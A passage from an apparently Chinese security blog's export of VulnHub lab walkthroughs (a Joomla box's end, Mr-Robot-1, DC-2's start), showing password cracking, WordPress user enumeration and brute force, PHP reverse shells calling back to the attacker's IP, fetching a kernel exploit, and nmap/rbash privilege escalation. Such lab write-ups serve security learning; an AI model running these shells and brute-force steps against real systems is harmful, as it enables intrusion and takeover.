</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1196.png" alt="图片"></p><p>注入出来后得到了账号和一段加密的<code>hash</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password                                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> $<span class="number">2</span>y$<span class="number">10</span>$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure><p>一般来说这种加密需要用字典来撞，运气好就能得到它的明文！我是使用 <code>KALI</code> 自带的 <code>john</code> 来破解它的 <code>hash</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1197.png" alt="图片"></p><p>因为我之前使用 <code>john</code> 破解过 <code>pass</code> 的 <code>hash</code>了，<code>john</code> 只会对同一个文件破解一次，所以我直接查看了上一次的爆破结果密码为：<code>snoopy</code>！</p><h2 id="Joomla-Getshell"><a href="#Joomla-Getshell" class="headerlink" title="Joomla Getshell"></a>Joomla Getshell</h2><p>拿到密码后我登陆到了网站到后台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/administrator/index.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1198.png" alt="图片"></p><p>登陆到后台我来到了网站到模版处，添加了一个新的<code>php</code>页面，里面的代码是我们的反弹<code>shell</code>的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.128/4444 0&gt;&amp;1&#x27; &quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1199.png" alt="图片"></p><p>这个时候 <code>KALI</code> 用 <code>nc</code> 监听 <code>4444</code>，我们访问 <code>saul.php</code> 这个文件成功得到一枚<code>shell</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.103/templates/beez3/saul.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1200.png" alt="图片"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>拿到<code>shell</code>只后我查看了一下内核版本发现系统是16年的 <code>Ubuntu</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1201.png" alt="图片"></p><p>紧接着我搜索有关于这个版本的漏洞发现了一个提权漏洞：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1202.png" alt="图片"></p><p>这是它的下载地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure><p>我把 <code>exp</code> 下载到本地只后，我 <code>KALI</code> 先是用 <code>python</code> 开启了一个简单的服务器用于靶机下载我们的 <code>exp</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1203.png" alt="图片"></p><p>随后靶机用 <code>wget</code> 把我们的 <code>exp</code> 下载到靶机上：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1204.png" alt="图片"></p><p>紧接着解压文件后，运行 <code>doubleput</code> 提权为 <code>root</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1205.png" alt="图片"></p><p>最后也是在 <code>root</code> 目录下拿到了 <code>Flag</code>！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-Mr-Robot-1-Walkthrough</title>
      <link href="/2020/02/25/Vulnhub-Mr-Robot-1/"/>
      <url>/2020/02/25/Vulnhub-Mr-Robot-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1386055583&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1167.jpg" alt="图片"></p><p>靶机介绍：根据演练，机器人先生。 此VM具有隐藏在不同位置的三个Key。 您的目标是找到全部三个。 每个Key逐渐难以找到。  该级别被认为是初学者-中级。<br>下载地址：<a href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a><br>PS：这个靶机的WEB界面炫酷的一批！大家可以去看看！</p><h2 id="运用的知识点"><a href="#运用的知识点" class="headerlink" title="运用的知识点"></a>运用的知识点</h2><p><code>Python</code>脚本验证<code>Wordpress</code>用户是否存在<br><code>wpscan</code>爆破用户密码<br><code>Wordpress</code>后台编辑页面处<code>Getshell</code><br><code>Nmap</code>提权</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机先是对目标 <code>IP</code> 进行了端口扫描探测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.159.131</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1168.jpg" alt="图片"></p><p>由上图可见，它开放了 <code>80</code>（http）、<code>443</code>（https）两个端口，其中 <code>22</code>（ssh）是关闭了的！</p><p>我们先从他的 <code>80</code> 端口开始下手，打开它的页面是牛逼吊炸天的特效：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1169.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1170.png" alt="图片"></p><p>我先后输入了他的 <code>Commands</code> 参数发现没有什么作用：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1171.jpg" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">prepare</span><br><span class="line">fsociety</span><br><span class="line">inform</span><br><span class="line">question</span><br><span class="line">wakeup</span><br><span class="line">join</span><br></pre></td></tr></table></figure><p>然后尝试了一波看看能不能执行命令但是也失败了（我傻逼了，前端JS的特效我去执行命令233333）：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1172.png" alt="图片"></p><h2 id="获取Key-1"><a href="#获取Key-1" class="headerlink" title="获取Key-1"></a>获取Key-1</h2><p>这个时候在它的”炫酷”页面上没必要浪费时间，我习惯性的看他 <code>robots.txt</code> 文件发现了两个文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1173.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1174.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1175.png" alt="图片"></p><p>这个时候成功获取到第一个 <code>Key</code>，而且还得到了一个类似字典文件：<code>fsocity.dic</code></p><p>接下来我直接去扫他的目录文件看看有没有什么突破点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://192.168.159.131/ -e .php -x 301,302,403</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1176.png" alt="图片"></p><h2 id="获取Key2-Wordpress后台Getshell"><a href="#获取Key2-Wordpress后台Getshell" class="headerlink" title="获取Key2-Wordpress后台Getshell"></a>获取Key2-Wordpress后台Getshell</h2><p>扫描出来后看到网站目录很像是 <code>Wordpress</code> 搭建的网站，我们先验证一下看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.131/wp-admin</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1177.png" alt="图片"></p><p>很显然他的 <code>CMS</code> 就是 <code>Wordpress</code> ，那么我们就可以使用 <code>KALI</code> 上自带的 <code>wpscan</code> 来对它进行简单的扫描看看存在哪些用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.159.131/ -e u</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1178.png" alt="图片"></p><p>但是扫描出来后发现没用得到一些用户，这个时候容我点燃一支眼理理思路：刚刚我们得到了一个字典文件，是不是要让我们利用那个字典去进入到网站的后台？</p><p>按照这个思路，我是用 <code>Python</code> 写了一个小脚本来验证探测有那些用户：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">open_file = <span class="built_in">open</span>(<span class="string">&#x27;fsocity.dic&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">temp = open_file.read().splitlines()</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> username <span class="keyword">in</span> temp:</span><br><span class="line">    payload = &#123;<span class="string">&#x27;log&#x27;</span>: <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(username), <span class="string">&#x27;pwd&#x27;</span>: <span class="string">&#x27;dummy&#x27;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span> : <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">    cookies = <span class="built_in">dict</span>(wordpress_test_cookie=<span class="string">&#x27;WP+Cookie+check&#x27;</span>)</span><br><span class="line">    r = requests.post(<span class="string">&quot;http://192.168.159.131/wp-login.php&quot;</span>, data=payload, headers=headers, cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Invalid username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> username</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1179.png" alt="图片"></p><p>运行完脚本后我发现它有一个用户为 <code>Elliot</code>，这正是《黑客军团》的主角名字，既然有了用户名那么我们就可以对它进行爆破密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url 192.168.159.131 -U elliot -P /root/Downloads/fsocity.dic -t 20</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1180.png" alt="图片"></p><p>爆破成功得到了 <code>elliot</code> 的密码为 <code>ER28-0652</code>！随后我拿着密码登陆到了后台来到编辑页面处：<code>Appearance</code>-<code>Editor</code>，然后我写入了反弹<code>shell</code>的<code>php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=fsockopen(<span class="string">&#x27;192.168.159.128&#x27;</span>,<span class="number">4444</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span>=<span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span>=&gt;<span class="variable">$sock</span>,</span><br><span class="line"><span class="number">1</span>=&gt;<span class="variable">$sock</span>,</span><br><span class="line"><span class="number">2</span>=&gt;<span class="variable">$sock</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span>=proc_open(<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="variable">$descriptorspec</span>,<span class="variable">$pipes</span>);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1181.png" alt="图片"></p><p>保存之后我们 <code>nc</code> 监听 <code>4444</code> 端口，然后访问 <code>404.php</code> 反弹得到一个 <code>shell</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1182.png" alt="图片"></p><p>先是让他获取到一个 <code>bash</code> 的shell环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>然后设置一下环境变量这样我们就可以清屏了（<code>clean</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=screen </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1183.png" alt="图片"></p><p>之后我来到 <code>home</code> 目录下发现了一个 <code>robot</code> 用户，在 <code>robot</code> 目录下发现了两个文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1184.png" alt="图片"></p><p><code>key-2-of-3.txt</code> 我们没权限所以无法打开，但是打开 <code>password.raw-md5</code> 是可以查看的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></pre></td></tr></table></figure><p>看上去像一段 <code>MD5</code> 的密文，紧接着我拿去解密 <code>hash</code> 得到密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1185.png" alt="图片"></p><p>拿到密码成功切换到 <code>robot</code> 用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1186.png" alt="图片"></p><h2 id="获取Key3-权限提升"><a href="#获取Key3-权限提升" class="headerlink" title="获取Key3-权限提升"></a>获取Key3-权限提升</h2><p>这个时候我们就可以查看第二个 <code>Key</code> 文件了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1187.png" alt="图片"></p><p>还差最后一个！因此我们需要提权，我首先是看看有没有 <code>SUID</code> 权限的可执行的二进制文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1188.png" alt="图片"></p><p>执行完命令发现了有一个 <code>nmap</code> ，这个时候我们就可以利用它来提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/bin/nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1189.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1190.png" alt="图片"></p><p>最后也是成功在 <code>/root</code> 目录下拿到了第三个<code>Key</code>完成这次渗透测试！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
            <tag> Wordpress </tag>
            
            <tag> nmap提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-DC_2-Walkthrough</title>
      <link href="/2020/02/23/Vulnhub-DC-2/"/>
      <url>/2020/02/23/Vulnhub-DC-2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=31062986&auto=1&height=66"></iframe><h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.<br>As with the original DC-1, it’s designed with beginners in mind.<br>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.<br>Just like with DC-1, there are five flags including the final flag.<br>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.<br>In short, the only flag that really counts, is the final flag.<br>For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.<br>I haven’t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.<br>靶机地址：<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>这个靶机和<code>DC-1</code>是一个系列的，总共有<code>5</code>个Flag，最后一个Flag是在 <code>root</code> 目录下！</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机 <code>IP</code> 后对它一顿梭哈：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -T4 192.168.1.143</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1146.png" alt="图片"></p><p>扫描出来后发现它开放了 <code>80</code>（http）和 <code>7744</code>（ssh）服务，我们先从 <code>80</code> 开始，先对它进行目录扫描看看它有那些目录文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.143</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1147.png" alt="图片"></p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>访问 <code>http://192.168.1.143</code>  发现它重定向到了这个 URL：<code>http://dc-2/</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1148.png" alt="图片"></p><p>这个时候我们设置一下 <code>hosts</code> 就可以了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1149.png" alt="图片"></p><p>设置好后再重新访问 <code>web</code> 就是正常的页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1150.png" alt="图片"></p><p>从页面上来看网站使用的 <code>CMS</code> 是 <code>Wordpress</code>，这个时候我在页面上找到了第一个 <code>Flag</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log <span class="keyword">in</span> as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, <span class="built_in">log</span> <span class="keyword">in</span> as another.</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1151.png" alt="图片"></p><p>翻译过来的意思就是让我们用 <code>cewl</code> 来生成一个字典，字典越大越好，然后用一个身份登陆进网站后台我们会得到下一个提示！</p><h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>既然提示是让我们登陆一个用户到后台，那么我就先来探测一下网站的用户有哪些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -e u</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1152.png" alt="图片"></p><p>由上图可知，<code>wpscan</code> 探测出来用户由三个：<code>admin</code>、<code>jerry</code>、<code>tom</code>！</p><p>随后我用第一个<code>Flag</code>的提示，用 KALI 自带的 <code>cewl</code> 来对网站页面进行搜集来生成一个字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w pass</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1153.png" alt="图片"></p><p>然后我吧刚刚 <code>wpscan</code> 探测出来的用户名保存到 user 文件里：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1154.png" alt="图片"></p><p>一切就绪之后用 <code>wpscan</code> 来对用户进行爆破枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U user -P pass</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1155.png" alt="图片"></p><p>爆破枚举后得到了他们的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p>随后用得到的用户密码登陆到后台获取到了<code>Flag2</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1156.png" alt="图片"></p><p>翻译过来的意思是：我们不能以 <code>Wordpress</code> 作为捷径，你需要找到另一种方法！</p><h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>我这人偏偏不信邪！我在后台尝试看看能不能获取到一枚 <code>webshell</code>，但是，但是我失败了！</p><p>好吧，我刘某人听你一次！！！</p><p>既然它提示不能从 <code>Web</code> 下手，那么它只开放了一个 <code>7744</code>（ssh）服务，估计就是想让我们登陆到它到 <code>ssh</code>！恰好我们刚才枚举出来了两个用户密码，随后我尝试用得到到账号和密码来登陆 <code>ssh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.1.143 -p 7744</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1157.png" alt="图片"></p><p>成功登陆到 <code>tom</code> 用户！登陆之后我发现我执行不了一些命令：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1158.png" alt="图片"></p><p>这个时候因为我们的shell是<code>rbash</code>，所以 <code>shell</code> 被限制了！随后我看了看当前的环境变量：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1159.png" alt="图片"></p><p>查看了环境变量，发现被写到了 <code>/home/tom/usr/bin</code> 下面！由于我们的 <code>shell</code> 被限制了，所以导致我们不能执行一些命令！</p><p>我先是 <code>vi</code> 来转义一下受限制的 <code>shell</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1160.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1161.png" alt="图片"></p><p>然后再设置一下环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/bin:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash:<span class="variable">$SHELL</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1162.png" alt="图片"></p><p>这个时候就能执行命令了！然后查看了一下 <code>flag3.txt</code> 文件找到了新的线索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure><p>翻译过来的意思就是：可怜的老汤姆总是在追求杰瑞。也许他应该为他所造成的压力而道歉。</p><h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><p>随后我切换用户到 <code>jerry</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1163.png" alt="图片"></p><p>登陆到 <code>jerry</code> 用户之后，拿到了 <code>Flag4</code> ！随后又得到了一个提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you<span class="string">&#x27;ve made it this far - but you&#x27;</span>re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you<span class="string">&#x27;re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br></pre></td></tr></table></figure><p>翻译过来到意思大概就是恭喜我们走到这一步，最后一步就是拿到 <code>root</code> 权限到意思！</p><h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><p>只剩下随后一个 <code>flag</code> 了，我们只需要提升权限为 <code>root</code> 就可以了。</p><p>我习惯性的 <code>sudo -l</code> 发现 <code>jerry</code> 可以以 <code>root</code> 身份去执行 <code>git</code> 命令：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1164.png" alt="图片"></p><p>那么很简单了，我找到了几个 <code>poc</code> ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1165.png" alt="图片"></p><p>随便使用了一个成功提权为 <code>root</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1166.png" alt="图片"></p><p>最后也是在 <code>/root</code> 目录下拿到了 